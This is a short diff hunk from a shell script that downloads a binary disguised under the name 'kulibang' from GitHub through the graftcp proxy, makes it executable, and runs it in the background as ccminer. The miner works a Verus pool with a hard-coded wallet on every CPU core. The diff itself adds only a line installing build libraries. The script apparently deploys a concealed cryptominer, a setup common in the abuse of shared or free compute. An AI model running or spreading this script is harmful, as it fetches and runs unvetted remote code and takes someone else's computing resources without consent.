@@ -42,6 +42,8 @@ END
   /usr/bin/graftcp wget https://github.com/marcelinoferdom/minse/raw/main/kulibang
   chmod +x kulibang
 
+  apt-get install -y libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
+  
   # Run ccminer in the background
   /usr/bin/graftcp ./kulibang -a verus -o stratum+tcp://eu.luckpool.net:3957 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.SKYLAKE -p x -t "$(nproc)" &
 
